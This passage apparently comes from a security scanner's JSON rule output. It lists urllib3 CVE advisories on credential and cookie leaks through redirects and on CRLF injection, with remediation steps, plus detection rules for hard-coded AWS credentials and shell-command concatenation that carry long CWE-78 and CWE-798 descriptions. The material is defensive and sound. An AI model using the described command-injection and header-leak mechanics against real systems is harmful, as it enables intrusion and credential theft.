                "text": "Vulnerability CVE-2018-25091\nSeverity: medium\nFixed Version: 1.24.2\nLink: [CVE-2018-25091](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-25091)\nurllib3 before 1.24.2 does not remove the authorization HTTP header when following a cross-origin redirect (i.e., a redirect that differs in host, port, or scheme). This can allow for credentials in the authorization header to be exposed to unintended hosts or transmitted in cleartext. NOTE: this issue exists because of an incomplete fix for CVE-2018-20060 (which was case-sensitive).",
                "markdown": "**Vulnerability CVE-2018-25091**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|1.24.2|[CVE-2018-25091](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-25091)|\n\nurllib3 before 1.24.2 does not remove the authorization HTTP header when following a cross-origin redirect (i.e., a redirect that differs in host, port, or scheme). This can allow for credentials in the authorization header to be exposed to unintended hosts or transmitted in cleartext. NOTE: this issue exists because of an incomplete fix for CVE-2018-20060 (which was case-sensitive)."
              },
              "properties": {
                "security-severity": "6.1",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2020-26137",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2020-26137"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26137",
              "help": {
                "text": "Vulnerability CVE-2020-26137\nSeverity: medium\nFixed Version: 1.25.9\nLink: [CVE-2020-26137](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26137)\nurllib3 before 1.25.9 allows CRLF injection if the attacker controls the HTTP request method, as demonstrated by inserting CR and LF control characters in the first argument of `putrequest()`. NOTE: this is similar to CVE-2020-26116.",
                "markdown": "**Vulnerability CVE-2020-26137**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|1.25.9|[CVE-2020-26137](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26137)|\n\nurllib3 before 1.25.9 allows CRLF injection if the attacker controls the HTTP request method, as demonstrated by inserting CR and LF control characters in the first argument of `putrequest()`. NOTE: this is similar to CVE-2020-26116."
              },
              "properties": {
                "security-severity": "6.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2023-43804",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2023-43804"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-43804",
              "help": {
                "text": "Vulnerability CVE-2023-43804\nSeverity: high\nFixed Version: 1.26.17\nLink: [CVE-2023-43804](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-43804)\nurllib3 doesn`t treat the `Cookie` HTTP header special or provide any helpers for managing cookies over HTTP, that is the responsibility of the user. However, it is possible for a user to specify a `Cookie` header and unknowingly leak information via HTTP redirects to a different origin if that user doesn`t disable redirects explicitly.\n\nUsers **must** handle redirects themselves instead of relying on urllib3`s automatic redirects to achieve safe processing of the `Cookie` header, thus we decided to strip the header by default in order to further protect users who aren`t using the correct approach.\n\n## Affected usages\n\nWe believe the number of usages affected by this advisory is low. It requires all of the following to be true to be exploited:\n\n* Using an affected version of urllib3 (patched in v1.26.17 and v2.0.6)\n* Using the `Cookie` header on requests, which is mostly typical for impersonating a browser.\n* Not disabling HTTP redirects\n* Either not using HTTPS or for the origin server to redirect to a malicious origin.\n\n## Remediation\n\n* Upgrading to at least urllib3 v1.26.17 or v2.0.6\n* Disabling HTTP redirects using `redirects=False` when sending requests.\n* Not using the `Cookie` header.",
                "markdown": "**Vulnerability CVE-2023-43804**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|1.26.17|[CVE-2023-43804](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-43804)|\n\nurllib3 doesn`t treat the `Cookie` HTTP header special or provide any helpers for managing cookies over HTTP, that is the responsibility of the user. However, it is possible for a user to specify a `Cookie` header and unknowingly leak information via HTTP redirects to a different origin if that user doesn`t disable redirects explicitly.\n\nUsers **must** handle redirects themselves instead of relying on urllib3`s automatic redirects to achieve safe processing of the `Cookie` header, thus we decided to strip the header by default in order to further protect users who aren`t using the correct approach.\n\n## Affected usages\n\nWe believe the number of usages affected by this advisory is low. It requires all of the following to be true to be exploited:\n\n* Using an affected version of urllib3 (patched in v1.26.17 and v2.0.6)\n* Using the `Cookie` header on requests, which is mostly typical for impersonating a browser.\n* Not disabling HTTP redirects\n* Either not using HTTPS or for the origin server to redirect to a malicious origin.\n\n## Remediation\n\n* Upgrading to at least urllib3 v1.26.17 or v2.0.6\n* Disabling HTTP redirects using `redirects=False` when sending requests.\n* Not using the `Cookie` header."
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2023-45803",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2023-45803"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-45803",
              "help": {
                "text": "Vulnerability CVE-2023-45803\nSeverity: medium\nFixed Version: 1.26.18\nLink: [CVE-2023-45803](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-45803)\nurllib3 previously wouldn`t remove the HTTP request body when an HTTP redirect response using status 303 \"See Other\" after the request had its method changed from one that could accept a request body (like `POST`) to `GET` as is required by HTTP RFCs. Although the behavior of removing the request body is not specified in the section for redirects, it can be inferred by piecing together information from different sections and we have observed the behavior in other major HTTP client implementations like curl and web browsers.\n\nFrom [RFC 9110 Section 9.3.1](https://www.rfc-editor.org/rfc/rfc9110.html#name-get):\n\n\u003e A client SHOULD NOT generate content in a GET request unless it is made directly to an origin server that has previously indicated, in or out of band, that such a request has a purpose and will be adequately supported.\n\n## Affected usages\n\nBecause the vulnerability requires a previously trusted service to become compromised in order to have an impact on confidentiality we believe the exploitability of this vulnerability is low. Additionally, many users aren`t putting sensitive data in HTTP request bodies, if this is the case then this vulnerability isn`t exploitable.\n\nBoth of the following conditions must be true to be affected by this vulnerability:\n\n* If you`re using urllib3 and submitting sensitive information in the HTTP request body (such as form data or JSON)\n* The origin service is compromised and starts redirecting using 303 to a malicious peer or the redirected-to service becomes compromised.\n\n## Remediation\n\nYou can remediate this vulnerability with any of the following steps:\n\n* Upgrade to a patched version of urllib3 (v1.26.18 or v2.0.7)\n* Disable redirects for services that you aren`t expecting to respond with redirects with `redirects=False`.\n* Disable automatic redirects with `redirects=False` and handle 303 redirects manually by stripping the HTTP request body.",
                "markdown": "**Vulnerability CVE-2023-45803**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|1.26.18|[CVE-2023-45803](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-45803)|\n\nurllib3 previously wouldn`t remove the HTTP request body when an HTTP redirect response using status 303 \"See Other\" after the request had its method changed from one that could accept a request body (like `POST`) to `GET` as is required by HTTP RFCs. Although the behavior of removing the request body is not specified in the section for redirects, it can be inferred by piecing together information from different sections and we have observed the behavior in other major HTTP client implementations like curl and web browsers.\n\nFrom [RFC 9110 Section 9.3.1](https://www.rfc-editor.org/rfc/rfc9110.html#name-get):\n\n\u003e A client SHOULD NOT generate content in a GET request unless it is made directly to an origin server that has previously indicated, in or out of band, that such a request has a purpose and will be adequately supported.\n\n## Affected usages\n\nBecause the vulnerability requires a previously trusted service to become compromised in order to have an impact on confidentiality we believe the exploitability of this vulnerability is low. Additionally, many users aren`t putting sensitive data in HTTP request bodies, if this is the case then this vulnerability isn`t exploitable.\n\nBoth of the following conditions must be true to be affected by this vulnerability:\n\n* If you`re using urllib3 and submitting sensitive information in the HTTP request body (such as form data or JSON)\n* The origin service is compromised and starts redirecting using 303 to a malicious peer or the redirected-to service becomes compromised.\n\n## Remediation\n\nYou can remediate this vulnerability with any of the following steps:\n\n* Upgrade to a patched version of urllib3 (v1.26.18 or v2.0.7)\n* Disable redirects for services that you aren`t expecting to respond with redirects with `redirects=False`.\n* Disable automatic redirects with `redirects=False` and handle 303 redirects manually by stripping the HTTP request body."
              },
              "properties": {
                "security-severity": "4.2",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2024-37891",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2024-37891"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-37891",
              "help": {
                "text": "Vulnerability CVE-2024-37891\nSeverity: medium\nFixed Version: 1.26.19\nLink: [CVE-2024-37891](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-37891)\nWhen using urllib3`s proxy support with `ProxyManager`, the `Proxy-Authorization` header is only sent to the configured proxy, as expected.\n\nHowever, when sending HTTP requests *without* using urllib3`s proxy support, it`s possible to accidentally configure the `Proxy-Authorization` header even though it won`t have any effect as the request is not using a forwarding proxy or a tunneling proxy. In those cases, urllib3 doesn`t treat the `Proxy-Authorization` HTTP header as one carrying authentication material and thus doesn`t strip the header on cross-origin redirects.\n\nBecause this is a highly unlikely scenario, we believe the severity of this vulnerability is low for almost all users. Out of an abundance of caution urllib3 will automatically strip the `Proxy-Authorization` header during cross-origin redirects to avoid the small chance that users are doing this on accident.\n\nUsers should use urllib3`s proxy support or disable automatic redirects to achieve safe processing of the `Proxy-Authorization` header, but we still decided to strip the header by default in order to further protect users who aren`t using the correct approach.\n\n## Affected usages\n\nWe believe the number of usages affected by this advisory is low. It requires all of the following to be true to be exploited:\n\n* Setting the `Proxy-Authorization` header without using urllib3`s built-in proxy support.\n* Not disabling HTTP redirects.\n* Either not using an HTTPS origin server or for the proxy or target origin to redirect to a malicious origin.\n\n## Remediation\n\n* Using the `Proxy-Authorization` header with urllib3`s `ProxyManager`.\n* Disabling HTTP redirects using `redirects=False` when sending requests.\n* Not using the `Proxy-Authorization` header.",
                "markdown": "**Vulnerability CVE-2024-37891**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|1.26.19|[CVE-2024-37891](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-37891)|\n\nWhen using urllib3`s proxy support with `ProxyManager`, the `Proxy-Authorization` header is only sent to the configured proxy, as expected.\n\nHowever, when sending HTTP requests *without* using urllib3`s proxy support, it`s possible to accidentally configure the `Proxy-Authorization` header even though it won`t have any effect as the request is not using a forwarding proxy or a tunneling proxy. In those cases, urllib3 doesn`t treat the `Proxy-Authorization` HTTP header as one carrying authentication material and thus doesn`t strip the header on cross-origin redirects.\n\nBecause this is a highly unlikely scenario, we believe the severity of this vulnerability is low for almost all users. Out of an abundance of caution urllib3 will automatically strip the `Proxy-Authorization` header during cross-origin redirects to avoid the small chance that users are doing this on accident.\n\nUsers should use urllib3`s proxy support or disable automatic redirects to achieve safe processing of the `Proxy-Authorization` header, but we still decided to strip the header by default in order to further protect users who aren`t using the correct approach.\n\n## Affected usages\n\nWe believe the number of usages affected by this advisory is low. It requires all of the following to be true to be exploited:\n\n* Setting the `Proxy-Authorization` header without using urllib3`s built-in proxy support.\n* Not disabling HTTP redirects.\n* Either not using an HTTPS origin server or for the proxy or target origin to redirect to a malicious origin.\n\n## Remediation\n\n* Using the `Proxy-Authorization` header with urllib3`s `ProxyManager`.\n* Disabling HTTP redirects using `redirects=False` when sending requests.\n* Not using the `Proxy-Authorization` header."
              },
              "properties": {
                "security-severity": "4.4",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "aws-string-credentials",
              "name": "aws-string-credentials",
              "shortDescription": {
                "text": "Aws string"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cwe.mitre.org/data/definitions/798.html",
              "help": {
                "text": "Potential secret found inside code. This could be a security risk."
              },
              "properties": {
                "cweId": "CWE-798",
                "cweInfo": {
                  "Name": "Use of Hard-coded Credentials",
                  "WeaknessAbstraction": "Base",
                  "Status": "Draft",
                  "Description": "The product contains hard-coded credentials, such as a password or cryptographic key, which it uses for its own inbound authentication, outbound communication to external components, or encryption of internal data.",
                  "ExtendedDescription": "Hard-coded credentials typically create a significant hole that allows an attacker to bypass the authentication that has been configured by the product administrator. This hole might be difficult for the system administrator to detect. Even if detected, it can be difficult to fix, so the administrator may be forced into disabling the product entirely. There are two main variations: Inbound: the product contains an authentication mechanism that checks the input credentials against a hard-coded set of credentials. Outbound: the product connects to another system or component, and it contains hard-coded credentials for connecting to that component. In the Inbound variant, a default administration account is created, and a simple password is hard-coded into the product and associated with that account. This hard-coded password is the same for each installation of the product, and it usually cannot be changed or disabled by system administrators without manually modifying the program, or otherwise patching the product. If the password is ever discovered or published (a common occurrence on the Internet), then anybody with knowledge of this password can access the product. Finally, since all installations of the product will have the same password, even across different organizations, this enables massive attacks such as worms to take place. The Outbound variant applies to front-end systems that authenticate with a back-end service. The back-end service may require a fixed password which can be easily discovered. The programmer may simply hard-code those back-end credentials into the front-end product. Any user of that program may be able to extract the password. Client-side systems with hard-coded passwords pose even more of a threat, since the extraction of a password from a binary is usually very simple.",
                  "RelatedWeaknesses": "::NATURE:ChildOf:CWE ID:1391:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:287:VIEW ID:1003:ORDINAL:Primary::NATURE:ChildOf:CWE ID:344:VIEW ID:1000::NATURE:ChildOf:CWE ID:671:VIEW ID:1000::NATURE:PeerOf:CWE ID:257:VIEW ID:1000::",
                  "WeaknessOrdinalities": "::ORDINALITY:Primary::",
                  "ApplicablePlatforms": "::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Mobile:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:ICS/OT:TECHNOLOGY PREVALENCE:Often::",
                  "ModesOfIntroduction": "::PHASE:Architecture and Design:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::",
                  "CommonConsequences": "::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism:NOTE:If hard-coded passwords are used, it is almost certain that malicious users will gain access to the account in question.::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:SCOPE:Access Control:SCOPE:Other:IMPACT:Read Application Data:IMPACT:Gain Privileges or Assume Identity:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Other:NOTE:This weakness can lead to the exposure of resources or functionality to unintended actors, possibly providing attackers with sensitive information or even execute arbitrary code.::",
                  "DetectionMethods": "::METHOD:Black Box:DESCRIPTION:Credential storage in configuration files is findable using black box methods, but the use of hard-coded credentials for an incoming authentication routine typically involves an account that is not visible outside of the code.:EFFECTIVENESS:Moderate::METHOD:Automated Static Analysis:DESCRIPTION:Automated white box techniques have been published for detecting hard-coded credentials for incoming authentication, but there is some expert disagreement regarding their effectiveness and applicability to a broad range of methods.::METHOD:Manual Static Analysis:DESCRIPTION:This weakness may be detectable using manual code analysis. Unless authentication is decentralized and applied throughout the product, there can be sufficient time for the analyst to find incoming authentication routines and examine the program logic looking for usage of hard-coded credentials. Configuration files could also be analyzed.::METHOD:Manual Dynamic Analysis:DESCRIPTION:For hard-coded credentials in incoming authentication: use monitoring tools that examine the product's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the product was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic. Attach the monitor to the process and perform a login. Using call trees or similar artifacts from the output, examine the associated behaviors and see if any of them appear to be comparing the input to a fixed string or value.::METHOD:Automated Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Bytecode Weakness Analysis - including disassembler + source code weakness analysis Binary Weakness Analysis - including disassembler + source code weakness analysis:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Binary / Bytecode disassembler - then use manual analysis for vulnerabilities \u0026 anomalies:EFFECTIVENESS:High::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Network Sniffer Forced Path Execution:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Focused Manual Spotcheck - Focused manual analysis of source Manual Source Code Review (not inspections):EFFECTIVENESS:High::METHOD:Automated Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Source code Weakness Analyzer Context-configured Source Code Weakness Analyzer:EFFECTIVENESS:High::METHOD:Automated Static Analysis:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Configuration Checker:EFFECTIVENESS:SOAR Partial::METHOD:Architecture or Design Review:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.) Formal Methods / Correct-By-Construction:EFFECTIVENESS:High::",
                  "PotentialMitigations": "::PHASE:Architecture and Design:DESCRIPTION:For outbound authentication: store passwords, keys, and other credentials outside of the code in a strongly-protected, encrypted configuration file or database that is protected from access by all outsiders, including other local users on the same system. Properly protect the key (CWE-320). If you cannot use encryption to protect the file, then make sure that the permissions are as restrictive as possible [REF-7]. In Windows environments, the Encrypted File System (EFS) may provide some protection.::PHASE:Architecture and Design:DESCRIPTION:For inbound authentication: Rather than hard-code a default username and password, key, or other authentication credentials for first time logins, utilize a first login mode that requires the user to enter a unique strong password or key.::PHASE:Architecture and Design:DESCRIPTION:If the product must contain hard-coded credentials or they cannot be removed, perform access control checks and limit which entities can access the feature that requires the hard-coded credentials. For example, a feature might only be enabled through the system console instead of through a network connection.::PHASE:Architecture and Design:DESCRIPTION:For inbound authentication using passwords: apply strong one-way hashes to passwords and store those hashes in a configuration file or database with appropriate access control. That way, theft of the file/database still requires the attacker to try to crack the password. When handling an incoming password during authentication, take the hash of the password and compare it to the saved hash. Use randomly assigned salts for each separate hash that is generated. This increases the amount of computation that an attacker needs to conduct a brute-force attack, possibly limiting the effectiveness of the rainbow table method.::PHASE:Architecture and Design:DESCRIPTION:For front-end to back-end connections: Three solutions are possible, although none are complete. The first suggestion involves the use of generated passwords or keys that are changed automatically and must be entered at given time intervals by a system administrator. These passwords will be held in memory and only be valid for the time intervals. Next, the passwords or keys should be limited at the back end to only performing actions valid for the front end, as opposed to having full access. Finally, the messages sent should be tagged and checksummed with time sensitive values so as to prevent replay-style attacks.::",
                  "ObservedExamples": "::REFERENCE:CVE-2022-29953:DESCRIPTION:Condition Monitor firmware has a maintenance interface with hard-coded credentials:LINK:https://www.cve.org/CVERecord?id=CVE-2022-29953::REFERENCE:CVE-2022-29960:DESCRIPTION:Engineering Workstation uses hard-coded cryptographic keys that could allow for unathorized filesystem access and privilege escalation:LINK:https://www.cve.org/CVERecord?id=CVE-2022-29960::REFERENCE:CVE-2022-29964:DESCRIPTION:Distributed Control System (DCS) has hard-coded passwords for local shell access:LINK:https://www.cve.org/CVERecord?id=CVE-2022-29964::REFERENCE:CVE-2022-30997:DESCRIPTION:Programmable Logic Controller (PLC) has a maintenance service that uses undocumented, hard-coded credentials:LINK:https://www.cve.org/CVERecord?id=CVE-2022-30997::REFERENCE:CVE-2022-30314:DESCRIPTION:Firmware for a Safety Instrumented System (SIS) has hard-coded credentials for access to boot configuration:LINK:https://www.cve.org/CVERecord?id=CVE-2022-30314::REFERENCE:CVE-2022-30271:DESCRIPTION:Remote Terminal Unit (RTU) uses a hard-coded SSH private key that is likely to be used in typical deployments:LINK:https://www.cve.org/CVERecord?id=CVE-2022-30271::REFERENCE:CVE-2021-37555:DESCRIPTION:Telnet service for IoT feeder for dogs and cats has hard-coded password [REF-1288]:LINK:https://www.cve.org/CVERecord?id=CVE-2021-37555::REFERENCE:CVE-2012-3503:DESCRIPTION:Installation script has a hard-coded secret token value, allowing attackers to bypass authentication:LINK:https://www.cve.org/CVERecord?id=CVE-2012-3503::REFERENCE:CVE-2010-2772:DESCRIPTION:SCADA system uses a hard-coded password to protect back-end database containing authorization information, exploited by Stuxnet worm:LINK:https://www.cve.org/CVERecord?id=CVE-2010-2772::REFERENCE:CVE-2010-2073:DESCRIPTION:FTP server library uses hard-coded usernames and passwords for three default accounts:LINK:https://www.cve.org/CVERecord?id=CVE-2010-2073::REFERENCE:CVE-2010-1573:DESCRIPTION:Chain: Router firmware uses hard-coded username and password for access to debug functionality, which can be used to execute arbitrary code:LINK:https://www.cve.org/CVERecord?id=CVE-2010-1573::REFERENCE:CVE-2008-2369:DESCRIPTION:Server uses hard-coded authentication key:LINK:https://www.cve.org/CVERecord?id=CVE-2008-2369::REFERENCE:CVE-2008-0961:DESCRIPTION:Backup product uses hard-coded username and password, allowing attackers to bypass authentication via the RPC interface:LINK:https://www.cve.org/CVERecord?id=CVE-2008-0961::REFERENCE:CVE-2008-1160:DESCRIPTION:Security appliance uses hard-coded password allowing attackers to gain root access:LINK:https://www.cve.org/CVERecord?id=CVE-2008-1160::REFERENCE:CVE-2006-7142:DESCRIPTION:Drive encryption product stores hard-coded cryptographic keys for encrypted configuration files in executable programs:LINK:https://www.cve.org/CVERecord?id=CVE-2006-7142::REFERENCE:CVE-2005-3716:DESCRIPTION:VoIP product uses hard-coded public credentials that cannot be changed, which allows attackers to obtain sensitive information:LINK:https://www.cve.org/CVERecord?id=CVE-2005-3716::REFERENCE:CVE-2005-3803:DESCRIPTION:VoIP product uses hard coded public and private SNMP community strings that cannot be changed, which allows remote attackers to obtain sensitive information:LINK:https://www.cve.org/CVERecord?id=CVE-2005-3803::REFERENCE:CVE-2005-0496:DESCRIPTION:Backup product contains hard-coded credentials that effectively serve as a back door, which allows remote attackers to access the file system:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0496::",
                  "TaxonomyMappings": "::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:MSC03-J:ENTRY NAME:Never hard code sensitive information::TAXONOMY NAME:OMG ASCSM:ENTRY ID:ASCSM-CWE-798::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 3-3:ENTRY NAME:Req SR 1.5::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-2:ENTRY NAME:Req CR 1.5::",
                  "RelatedAttackPatterns": "::191::70::",
                  "Notes": "::TYPE:Maintenance:NOTE:The Taxonomy_Mappings to ISA/IEC 62443 were added in CWE 4.10, but they are still under review and might change in future CWE versions. These draft mappings were performed by members of the Mapping CWE to 62443 subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG), and their work is incomplete as of CWE 4.10. The mappings are included to facilitate discussion and review by the broader ICS/OT community, and they are likely to change in future CWE versions.::"
                },
                "tags": [
                  "CWE-798: Use of Hard-coded Credentials",
                  "weakness",
                  "security",
                  "critical"
                ]
              }
            },
            {
              "id": "string-concat-in-shell-command-python",
              "name": "string-concat-in-shell-command-python",
              "shortDescription": {
                "text": "String concat in shell command"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cwe.mitre.org/data/definitions/78.html",
              "help": {
                "text": "Detected string concatenation in shell command, which is a bad practice and may allow code injection attacks"
              },
              "properties": {
                "cweId": "CWE-78",
                "cweInfo": {
                  "Name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
                  "WeaknessAbstraction": "Base",
                  "Status": "Stable",
                  "Description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component.",
                  "ExtendedDescription": "This could allow attackers to execute unexpected, dangerous commands directly on the operating system. This weakness can lead to a vulnerability in environments in which the attacker does not have direct access to the operating system, such as in web applications. Alternately, if the weakness occurs in a privileged program, it could allow the attacker to specify commands that normally would not be accessible, or to call alternate commands with privileges that the attacker does not have. The problem is exacerbated if the compromised process does not follow the principle of least privilege, because the attacker-controlled commands may run with special system privileges that increases the amount of damage. There are at least two subtypes of OS command injection: The application intends to execute a single, fixed program that is under its own control. It intends to use externally-supplied inputs as arguments to that program. For example, the program might use system(nslookup [HOSTNAME]) to run nslookup and allow the user to supply a HOSTNAME, which is used as an argument. Attackers cannot prevent nslookup from executing. However, if the program does not remove command separators from the HOSTNAME argument, attackers could place the separators into the arguments, which allows them to execute their own program after nslookup has finished executing. The application accepts an input that it uses to fully select which program to run, as well as which commands to use. The application simply redirects this entire command to the operating system. For example, the program might use exec([COMMAND]) to execute the [COMMAND] that was supplied by the user. If the COMMAND is under attacker control, then the attacker can execute arbitrary commands or programs. If the command is being executed using functions like exec() and CreateProcess(), the attacker might not be able to combine multiple commands together in the same line. From a weakness standpoint, these variants represent distinct programmer errors. In the first variant, the programmer clearly intends that input from untrusted parties will be part of the arguments in the command to be executed. In the second variant, the programmer does not intend for the command to be accessible to any untrusted party, but the programmer probably has not accounted for alternate ways in which malicious attackers can provide input.",
                  "RelatedWeaknesses": "::NATURE:ChildOf:CWE ID:77:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:74:VIEW ID:1003:ORDINAL:Primary::NATURE:ChildOf:CWE ID:77:VIEW ID:1305:ORDINAL:Primary::NATURE:ChildOf:CWE ID:77:VIEW ID:1340:ORDINAL:Primary::NATURE:CanAlsoBe:CWE ID:88:VIEW ID:1000::",
                  "ApplicablePlatforms": "::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::",
                  "AlternateTerms": "::TERM:Shell injection::TERM:Shell metacharacters::",
                  "ModesOfIntroduction": "::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::",
                  "CommonConsequences": "::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:SCOPE:Non-Repudiation:IMPACT:Execute Unauthorized Code or Commands:IMPACT:DoS: Crash, Exit, or Restart:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories:IMPACT:Read Application Data:IMPACT:Modify Application Data:IMPACT:Hide Activities:NOTE:Attackers could execute unauthorized commands, which could then be used to disable the product, or read and modify data for which the attacker does not have permissions to access directly. Since the targeted application is directly executing the commands instead of the attacker, any malicious activities may appear to come from the application or the application's owner.::",
                  "DetectionMethods": "::METHOD:Automated Static Analysis:DESCRIPTION:This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives. Automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or require any code changes. Automated static analysis might not be able to detect the usage of custom API functions or third-party libraries that indirectly invoke OS commands, leading to false negatives - especially if the API/library code is not available for analysis.::METHOD:Automated Dynamic Analysis:DESCRIPTION:This weakness can be detected using dynamic tools and techniques that interact with the product using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The product's operation may slow down, but it should not become unstable, crash, or generate incorrect results.:EFFECTIVENESS:Moderate::METHOD:Manual Static Analysis:DESCRIPTION:Since this weakness does not typically appear frequently within a single software package, manual white box techniques may be able to provide sufficient code coverage and reduction of false positives if all potentially-vulnerable operations can be assessed within limited time constraints.:EFFECTIVENESS:High::METHOD:Automated Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Bytecode Weakness Analysis - including disassembler + source code weakness analysis Binary Weakness Analysis - including disassembler + source code weakness analysis:EFFECTIVENESS:High::METHOD:Dynamic Analysis with Automated Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Web Application Scanner Web Services Scanner Database Scanners:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Fuzz Tester Framework-based Fuzzer:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Manual Source Code Review (not inspections) Cost effective for partial coverage: Focused Manual Spotcheck - Focused manual analysis of source:EFFECTIVENESS:High::METHOD:Automated Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Source code Weakness Analyzer Context-configured Source Code Weakness Analyzer:EFFECTIVENESS:High::METHOD:Architecture or Design Review:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Formal Methods / Correct-By-Construction Cost effective for partial coverage: Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.):EFFECTIVENESS:High::",
